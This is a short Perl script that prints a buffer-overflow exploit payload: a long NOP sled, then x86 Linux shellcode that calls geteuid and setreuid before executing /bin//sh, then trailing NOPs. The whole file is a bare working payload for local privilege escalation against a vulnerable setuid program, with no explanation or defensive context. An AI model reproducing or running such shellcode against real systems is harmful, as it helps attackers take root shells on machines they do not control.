#! /usr/bin/perl

print "\x90"x200;
print "\x6a\x31\x58\xcd\x80\x89\xc3\x89";
print "\xc1\x6a\x46\x58\xcd\x80\x31\xc0";
print "\x50\x68\x2f\x2f\x73\x68\x68\x2f";
print "\x62\x69\x6e\x54\x5b\x50\x53\x89";
print "\xe1\x31\xd2\xb0\x0b\xcd\x80";
print "\x90"x50;
